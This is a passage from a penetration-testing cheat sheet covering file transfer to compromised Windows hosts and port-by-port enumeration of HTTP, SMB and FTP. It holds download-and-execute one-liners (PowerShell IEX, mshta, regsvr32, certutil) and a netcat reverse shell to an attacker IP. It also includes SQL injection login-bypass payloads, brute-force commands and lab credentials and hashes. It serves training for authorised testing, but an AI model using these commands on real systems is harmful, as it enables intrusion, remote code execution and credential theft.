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'
                # Note: a link to a directory displays with @ and links with /
            f.write(('&lt;tr&gt;&lt;td&gt;&lt;img src="%s" width="24" height="24"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="%s"&gt;%s&lt;/a&gt;&lt;/td&gt;&lt;td style="text-align:right; font-weight: bold; color:#FF0000"&gt;%s&lt;/td&gt;&lt;td style="text-align:right; font-weight: bold;"&gt;%s&lt;/td&gt;&lt;/tr&gt;\n'
                    % ( dirimage, urllib.parse.quote(linkname), html.escape(displayname) , fsize , created_date )).encode(enc))
        f.write(b"&lt;/table&gt;&lt;hr&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")
        length = f.tell()
        f.seek(0)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        return f

    def translate_path(self, path):
        """Translate a /-separated PATH to the local filename syntax.

        Components that mean special things to the local file system
        (e.g. drive or directory names) are ignored.  (XXX They should
        probably be diagnosed.)

        """
        # abandon query parameters
        path = path.split('?',1)[0]
        path = path.split('#',1)[0]
        path = posixpath.normpath(urllib.parse.unquote(path))
        words = path.split('/')
        words = [_f for _f in words if _f]
        path = os.getcwd()
        for word in words:
            drive, word = os.path.splitdrive(word)
            head, word = os.path.split(word)
            if word in (os.curdir, os.pardir): continue
            path = os.path.join(path, word)
        return path
 
    def copyfile(self, source, outputfile):
        """Copy all data between two file objects.

        The SOURCE argument is a file object open for reading
        (or anything with a read() method) and the DESTINATION
        argument is a file object open for writing (or
        anything with a write() method).

        The only reason for overriding this would be to change
        the block size or perhaps to replace newlines by CRLF
        -- note however that this the default server uses this
        to copy binary data as well.

        """
        shutil.copyfileobj(source, outputfile)
 
    def guess_type(self, path):
        """Guess the type of a file.

        Argument is a PATH (a filename).

        Return value is a string of the form type/subtype,
        usable for a MIME Content-type header.

        The default implementation looks the file's extension
        up in the table self.extensions_map, using application/octet-stream
        as a default; however it would be permissible (if
        slow) to look inside the data to make a better guess.

        """
 
        base, ext = posixpath.splitext(path)
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        ext = ext.lower()
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        else:
            return self.extensions_map['']
 
    if not mimetypes.inited:
        mimetypes.init() # try to read system mime.types
    extensions_map = mimetypes.types_map.copy()
    extensions_map.update({
        '': 'application/octet-stream', # Default
        '.py': 'text/plain',
        '.c': 'text/plain',
        '.h': 'text/plain',
        })
 
parser = argparse.ArgumentParser()
parser.add_argument('--bind', '-b', default='', metavar='ADDRESS',
                        help='Specify alternate bind address '
                             '[default: all interfaces]')
parser.add_argument('port', action='store',
                        default=8000, type=int,
                        nargs='?',
                        help='Specify alternate port [default: 8000]')
args = parser.parse_args()

PORT = args.port
BIND = args.bind
HOST = BIND

if HOST == '':
	HOST = 'localhost'

Handler = SimpleHTTPRequestHandler

with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
	serve_message = "Serving HTTP on {host} port {port} (http://{host}:{port}/) ..."
	print(serve_message.format(host=HOST, port=PORT))
	httpd.serve_forever()


</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="transferring-files-to-windows"><a class="header" href="#transferring-files-to-windows">Transferring Files to Windows</a></h1>
<p>Transferring files to Linux is usually pretty easy. We can use <code>netcat</code>, <code>wget</code>, or <code>curl</code>, which most systems have as default. But windows does not have these tools.</p>
<h2 id="to-and-from-client-to-server-smb--rdp"><a class="header" href="#to-and-from-client-to-server-smb--rdp">To and from client to server SMB / RDP</a></h2>
<p>If you are using RDP on windows you can just attach a directory to share from when you start your RDP session.</p>
<pre><code>xfreerdp /u:MYUSERNAME /v:10.10.10.1111 /drive:fildel,/home/temp/tmp
</code></pre>
<p>Now you can simply open the Computer part in your Explorer window, and you should see the disk <code>fildel</code>. In that share you can share documents between your computer and the RDP server.</p>
<h2 id="from-client-to-server-smb--rdp"><a class="header" href="#from-client-to-server-smb--rdp">From client to server SMB / RDP</a></h2>
<p>A simple way is simply to to connect to your server with xfreerdp and then open up the fil-browser in your linux machine, and copy the file. Then go to your windows server and simply paste the file. For me it only works in that direction, and not the reverse.</p>
<h2 id="from-x-server-to-windows-bitsadmin"><a class="header" href="#from-x-server-to-windows-bitsadmin">From X server to Windows (Bitsadmin)</a></h2>
<p>Downloading a file with CMD can be done with bitsadmin.</p>
<pre><code>bitsadmin /transfer aaa http://192.168.66.87/apaa.txt c:\Users\temp\aaa.txt
</code></pre>
<h2 id="ftp"><a class="header" href="#ftp">FTP</a></h2>
<p>Most windows machines have a ftp-client included. But we can't use it interactively since that most likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client. Let me demonstrate.</p>
<p>On the compromised machine we echo out the following commands into a file</p>
<pre><code>echo open 192.168.1.101 21&gt; ftp.txt
echo USER asshat&gt;&gt; ftp.txt
echo mysecretpassword&gt;&gt; ftp.txt
echo bin&gt;&gt; ftp.txt
echo GET wget.exe&gt;&gt; ftp.txt
echo bye&gt;&gt; ftp.txt
</code></pre>
<p>Then run this command to connect to the ftp</p>
<pre><code>ftp -v -n -s:ftp.txt
</code></pre>
<p>Of course you need to have a ftp-server configured with the user asshat and the password to mysecretpassword.</p>
<h2 id="tftp"><a class="header" href="#tftp">TFTP</a></h2>
<p>Works by default on:</p>
<p><strong>Windows XP</strong></p>
<p><strong>Windows 2003</strong></p>
<p>A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactively. Which means less risk of losing your shell.</p>
<p>Kali has a TFTP server build in.<br />
You can server up some files with it like this</p>
<pre><code>atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart
</code></pre>
<p>Now you can put stuff in <code>/srv/tftp</code> and it will be served. Remember that TFTP used UDP. So if you run <code>netstat</code> it will not show it as listening.</p>
<p>You can see it running like this</p>
<pre><code>netstat -a -p UDP | grep udp
</code></pre>
<p>So now you can upload and download whatever from the windows-machine like this</p>
<pre><code>tftp -i 192.160.1.101 GET wget.exe
</code></pre>
<p>If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-interactive way.</p>
<pre><code>tftp 192.160.1.101
GET test.txt
</code></pre>
<p>I usually put all files I want to make available in <code>/srv/tftp</code></p>
<p>If you want to make sure that the file was uploaded correct you can check in the syslog. Grep for the IP like this:</p>
<p><code>grep 192.168.1.101 /var/log/syslog</code></p>
<h2 id="vbscript"><a class="header" href="#vbscript">VBScript</a></h2>
<p>Here is a good script to make a wget-clone in VB.</p>
<p>If it doesn't work try piping it through unix2dos before copying it.</p>
<pre><code>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs
echo Err.Clear &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") &gt;&gt; wget.vbs
echo http.Open "GET",strURL,False &gt;&gt; wget.vbs
echo http.Send &gt;&gt; wget.vbs
echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") &gt;&gt; wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs
echo strData = "" &gt;&gt; wget.vbs
echo strBuffer = "" &gt;&gt; wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs
echo Next &gt;&gt; wget.vbs
echo ts.Close &gt;&gt; wget.vbs
</code></pre>
<p>You then execute the script like this:</p>
<pre><code>cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
</code></pre>
<h2 id="powershell"><a class="header" href="#powershell">PowerShell</a></h2>
<p>This is how we can download a file using PowerShell. Remember since we only have a non-interactive shell we cannot start PowerShell.exe, because our shell can't handle that. But we can get around that by creaing a PowerShell-script and then executing the script:</p>
<pre><code>echo $storageDir = $pwd &gt; wget.ps1
echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1
echo $url = "http://192.168.1.101/file.exe" &gt;&gt;wget.ps1
echo $file = "output-file.exe" &gt;&gt;wget.ps1
echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1
</code></pre>
<p>Now we invoke it with this crazy syntax:</p>
<pre><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
</code></pre>
<h2 id="debugexe"><a class="header" href="#debugexe">Debug.exe</a></h2>
<p>This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the <code>debug.exe</code> program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like <code>netcat</code>. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with <code>debug.exe</code>.</p>
<p><code>Debug.exe</code> can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:</p>
<pre><code>upx -9 nc.exe
</code></pre>
<p>Now it only weights 29 kb. Perfect. So now let's disassemble it:</p>
<pre><code>wine exe2bat.exe nc.exe nc.txt
</code></pre>
<p>Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe</p>
<h1 id="transfering-files-windows-to-linux"><a class="header" href="#transfering-files-windows-to-linux">Transfering files Windows to linux</a></h1>
<h2 id="smb-client"><a class="header" href="#smb-client">smb-client</a></h2>
<p>If you only have a hash of a user which is</p>
<pre><code>/etc/init.d/pure-ftpd

</code></pre>
<h3 id="smb-server-setup"><a class="header" href="#smb-server-setup">SMB Server setup</a></h3>
<pre><code># Set up a SMB server using smbserver.py from impacket
smbserver.py SHARE_NAME path/to/share

# From target Windows:
net view \\KALI_IP
(Should display the SHARE_NAME)

dir \\KALI_IP\SHARE_NAME
copy \\KALI_IP\SHARE_NAME\file.exe .

# Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user
# can be usefull to PTH, or crack passwords

# Since Windows 10, you can't do anonymous smb server anymore
sudo python smbserver.py SDFR /BloodHound/Ingestors -smb2support -username "peon" -password "peon"
net use Z: \\192.168.30.130\SDFR /user:peon peon
net use Z: /delete /y

impacket smbserver
net use z: \\attackerip\sharename

</code></pre>
<h3 id="build-a-ftp-and-transfer-file"><a class="header" href="#build-a-ftp-and-transfer-file">Build a FTP and ==transf==er file</a></h3>
<pre><code># Set up a ftp downloading script on the target machine:
echo open IP 21 &gt; ftp.txt
echo USER acknak&gt;&gt; ftp.txt
echo jLQRZy4gyLhmMqz2whTw&gt;&gt; ftp.txt
echo ftp &gt;&gt; ftp.txt
echo bin &gt;&gt; ftp.txt
echo GET wget.exe &gt;&gt; ftp.txt
echo bye &gt;&gt; ftp.txt

# Download the prepared file:
ftp -v -n -s:ftp.txt

# Start tftp server on Kali
aftpd start

# Transfer files from Kali to Windows (from windows terminal)
tftp -I IPADDRESS GET nameoffile.exe

# You can have a shell using this
echo open &lt;attacker_ip&gt; 21&gt; ftp.txt
echo USER offsec&gt;&gt; ftp.txt
echo ftp&gt;&gt; ftp.txt
echo bin &gt;&gt; ftp.txt
echo GET nc.exe &gt;&gt; ftp.txt
echo bye &gt;&gt; ftp.txt
ftp -v -n -s:ftp.txt
nc.exe &lt;attacker_ip&gt; 1234 -e cmd.exe

</code></pre>
<h3 id="downloading"><a class="header" href="#downloading">Downloading</a></h3>
<pre><code>Quick way to test webdav for execution:
davtest -url http://192.168.1.209

Also use cadaver then open $ip to access WebDav on cli

# Execute file from a WebDav server:
cscript //E:jscript \\IP\folder\payload.txt

# Download using wget.vbs
cscript wget.vbs http://IP/file.exe file.exe

# One liner download file from WebServer:
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
powershell -exec bypass -c "(new-object System.Net.WebClient).DownloadFile('http://IP/file.exe','C:\Users\user\Desktop\file.exe')"

# Download from WebDAV Server:
powershell -exec bypass -f \\IP\folder\payload.ps1

</code></pre>
<h3 id="using-file"><a class="header" href="#using-file">Using File</a></h3>
<pre><code>echo $storageDir = $pwd &gt; wget.ps1
echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1
echo $url = "http://10.10.14.11/Dropper/Windows/shell.exe" &gt;&gt;wget.ps1
echo $file = "shell.exe" &gt;&gt;wget.ps1
echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1
	
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

</code></pre>
<h3 id="downloading-and-execution"><a class="header" href="#downloading-and-execution">Downloading and Execution</a></h3>
<pre><code># Method 1
mshta vbscript:Close(Execute("GetObject(""script:http://IP/payload.sct"")"))

# Method 2
mshta http://IP/payload.hta

# Method 3 (Using WebDav)
mshta \\IP\payload.hta

#Download and execute XSL using wmic
wmic os get /format:"https://webserver/payload.xsl"


# Download and execute over a WebServer:
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll

# Using WebDAV
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll

# Powershell Cmdlet
Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"

# Powershell One-Line
(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 

# In Memory Execution
IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')


</code></pre>
<h3 id="multiple-ways-using-certutil"><a class="header" href="#multiple-ways-using-certutil">Multiple ways using certutil</a></h3>
<pre><code># Multiple ways to download and execute files:
certutil -urlcache -split -f http://webserver/payload payload

# Execute a specific .dll:
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll

# Execute an .exe:
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe



</code></pre>
<h3 id="tips-for-non-interactive-shell-using-nc"><a class="header" href="#tips-for-non-interactive-shell-using-nc">Tips for non-interactive shell using nc</a></h3>
<pre><code># In a case of a non-interactive shell, you can transfer up to 64k of memory
# You can increase that size by compressing the willing file (let's say nc.exe) using:
upx -9 nc.exe

# nc.exe has now been compressed but remains functional
# Now convert it to text instructions using exe2bat
wine exe2bat.exe nc.exe nc.txt

# Then copy paste the content of nc.txt to the remote shell !
# You'll get a proper nc.exe using debug.exe from the target !

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ports"><a class="header" href="#ports">Ports</a></h2>
<h3 id="links-2"><a class="header" href="#links-2">Links</a></h3>
<ul>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html">Total OSCP Guide</a></li>
<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web">HackTricks 80</a></li>
<li><a href="https://steflan-security.com/smb-enumeration-guide/">SMB Enum Guide</a></li>
<li><a href="https://github.com/3ndG4me/AutoBlue-MS17-010.git">AutoBlueSMB</a></li>
<li><a href="https://steflan-security.com/ftp-enumeration-guide/">FTP Enum</a></li>
<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns">HackTricks 53</a></li>
<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh">HackTricks 22</a></li>
<li><a href="https://www.linuxjournal.com/content/sending-email-netcat">NetCat Email</a></li>
<li><a href="https://infosecwriteups.com/what-do-netcat-smtp-and-self-xss-have-in-common-stored-xss-a05648b72002">Netcat SMTP</a></li>
<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server">MSSQL HackTricks</a></li>
<li><a href="https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/">Evil WinRM Guide</a></li>
</ul>
<h3 id="80443---http"><a class="header" href="#80443---http"><ins>80/443 - HTTP</ins></a></h3>
<h4 id="first-thing"><a class="header" href="#first-thing">First Thing</a></h4>
<pre><code>
1. Directory busting: dirb http:///&lt;IP&gt;/ 

2. Directory busting: gobuster dir -x php,txt,xml,asp,aspx --url http://&lt;IP&gt;/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -b 404 -f 

3. Directory busting: ffuf -c -u http:///FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

4. Vulnerability Scan: nmap &lt;IP&gt; -p80 -script vuln -Pn

5. Vulnerability Scan: nikto -host http://&lt;IP&gt;/ 

6. WordPress Scan: wpscan --url http://&lt;IP&gt;/

</code></pre>
<h4 id="while-scans-run"><a class="header" href="#while-scans-run">While Scans run:</a></h4>
<pre><code>1. Try Weak Credentials, Default Login, Intercept Request in Burp, and Try Dictionary attack to crack the credentials, Try SQLi 

2. Check the Source code if anything Juicy

3. If you see any CMS (Joomla, WordPress, Tomcat, etc), visit my go-to website here

4. Sometimes you also find creds in CMS's Github. Also, look for config files, and Readme files which can reveal sensitive info.

5. If you find SQLi, LFI/RFI, or File Uploads then go to respectice section in Gaining Access.

8. Note all the usernames + keywords, sometimes cewl tool helps for cracking the password

9. Find exploits using keywords in the following manner: keyword poc, keyword GitHub, keyword htb, keyword hack the box

</code></pre>
<h4 id="default-creds-login-page"><a class="header" href="#default-creds-login-page">Default Creds Login Page</a></h4>
<div class="table-wrapper"><table><thead><tr><th>User</th><th>Pass</th></tr></thead><tbody>
<tr><td>admin</td><td>admin</td></tr>
<tr><td>admin</td><td>password</td></tr>
<tr><td>admin</td><td>1234</td></tr>
<tr><td>admin</td><td>123456</td></tr>
<tr><td>root</td><td>toor</td></tr>
<tr><td>test</td><td>test</td></tr>
<tr><td>guest</td><td>guest</td></tr>
<tr><td>anonymous</td><td>anonymous</td></tr>
</tbody></table>
</div>
<h4 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h4>
<div class="table-wrapper"><table><thead><tr><th>User</th><th>Pass</th></tr></thead><tbody>
<tr><td>tom</td><td>tom</td></tr>
<tr><td>tom</td><td>' or '1'='1</td></tr>
<tr><td>tom</td><td>' or 1='1</td></tr>
<tr><td>tom</td><td>1' or 1=1 -- -</td></tr>
<tr><td>' or '1'='1</td><td>' or '1'='1</td></tr>
<tr><td>' or ' 1=1</td><td>' or ' 1=1</td></tr>
<tr><td>1' or 1=1 -- -</td><td>blah</td></tr>
<tr><td>whatever' or '1'='1</td><td>whatever' or '1'='1</td></tr>
</tbody></table>
</div>
<h4 id="mysql-sqli-login-bypassfuzzdbtxt"><a class="header" href="#mysql-sqli-login-bypassfuzzdbtxt">MySQL-SQLi-Login-Bypass.fuzzdb.txt</a></h4>
<ul>
<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt?source=post_page-----c95930e9523d--------------------------------">SecLists Fuzzing</a></li>
</ul>
<pre><code># regex replace as many as you can with your fuzzer for best results:
# &lt;user-fieldname&gt; &lt;pass-fieldname&gt; &lt;username&gt;
# also try to brute force a list of possible usernames, including possile admin acct names
&lt;username&gt;' OR 1=1--
'OR '' = '	Allows authentication without a valid username.
&lt;username&gt;'--
' union select 1, '&lt;user-fieldname&gt;', '&lt;pass-fieldname&gt;' 1--
'OR 1=1--
</code></pre>
<h3 id="139445---smb"><a class="header" href="#139445---smb"><ins>139/445 - SMB</ins></a></h3>
<h4 id="try"><a class="header" href="#try">Try</a></h4>
<pre><code>1. Find SMB Version: 
	1. tcpdump -i tun0 port &lt;Victim Port&gt; and src &lt;Victim IP&gt; -s0 -A -n 2&gt;/dev/null 
	2. crackmapexec smb &lt;Victim IP&gt; --shares --port &lt;Victim Port&gt; 1&gt;/dev/null 2&gt;/dev/null

2. Nmap Scan: nmap --script "safe or smb-enum-*" -p 445 &lt;IP&gt;

3. Shares: smbclient -L \\\\&lt;IP&gt;\\

4. Connect: smbclient -N //support.htb/support-tools

5. Changing Shares: smbclient -L \\\\&lt;IP&gt;\\C$

6. Username/Domain/No Pass: smbclient \\\\$ip\\Public -U sequel/root

7. Username/Password: smbclient //flight.htb/users -U svc_apache 'S@Ss!K@*t13'

8. Username/password/Domain: smbclient -L \\\\&lt;IP&gt;\\C$ -U &lt;Domain&gt;/&lt;username&gt;%&lt;password&gt;

9. $smbclient -L myhost -U DOMAIN/user -W workgroup

10. Lists file with permissions: smbmap -H &lt;IP&gt;

11. Downloading: smbget -R smb://&lt;IP&gt;/anonymous

12. type prompt off, recurse on -&gt; lets us download all the files using mget *

13. Nmap Vuln Script: nmap --script "smb-vuln*" -p 139,445 &lt;IP&gt;

14. crackmapexec smb &lt;IP&gt;

15. Users: crackmapexec smb &lt;IP&gt; --users

16. Shares: crackmapexec smb &lt;IP&gt; --shares

17. Try Crackmapexec, psexec, smbexec, wmiexec

18.  smbclient //10.20.85.111/Users -U SKYLARK/k.smith --pw-nt-hash d2a87ca4d6735870dc2357a83960c379

19. impacket-smbclient  -hashes 00000000000000000000000000000000:d2a87ca4d6735870dc2357a83960c379 skylark/k.smith@10.20.109.111

20. crackmapexec smb 10.20.109.111 -u backup_service -p It4Server -x 'certutil -urlcache -split -f “http://192.168.45.188:8000/110reverse.exe” C:\110reverse.exe'

21. crackmapexec smb $ip --shares -u usernames.txt -p passwords.txt --continue-on-success

</code></pre>
<h4 id="if-we-have-username-and-password"><a class="header" href="#if-we-have-username-and-password">If we have Username and Password</a></h4>
<pre><code>1. Authenticated SMB Shares: smbclient \\\new-site -U &lt;domain_name\username&gt;

2. Null login: crackmapexec smb &lt;IP&gt; --shares -u ' ' -p ''
3. Null login: crackmapexec smb &lt;IP&gt; --shares -u '' -p ''

4. Null login: crackmapexec smb &lt;IP&gt; -u ' ' -p ''

5. Default Guest login: crackmapexec smb &lt;IP&gt; -u 'guest' -p ''

6. LDAP search:  ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&amp;(objectclass=user))" -h &lt;IP&gt; | grep -i samaccountname: | cut -f 2 -d " "

7. Auth Check: crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --local-auth

8. Auth Check: crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt;

9. crackmapexec smb 192.168.214.249 -u /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/wordlists/seclists/Passwords/darkweb2017-top100.txt -d relia.com --continue-on-success 
</code></pre>
<h3 id="21---ftp"><a class="header" href="#21---ftp"><ins>21 - FTP</ins></a></h3>
<pre><code>1. Try FTP Default creds - anonymous:anonymous / admin:admin

2. Once you log in, type passive and binary for file transfer modes

3. If anonymous login -&gt; create a payload, upload and try visit &lt;IP&gt;/exploit.asp

4. FTP Login: ftp &lt;username&gt;@&lt;IP&gt;

5. Banner Grabbing: nc -nv &lt;IP&gt; 21

6. Grab Cert: openssl s_client -connect &lt;IP&gt;:21 -starttls ftp

7. Download all the files in share: wget -m ftp://anonymous:anon@&lt;IP&gt;

8. Download all: wget -m --no-passive ftp://:@&lt;IP&gt;

9. Different port: ftp &lt;IP&gt; -P 3084

10. Bruteforce: hydra -l elly -e nsr ftp://$ip 
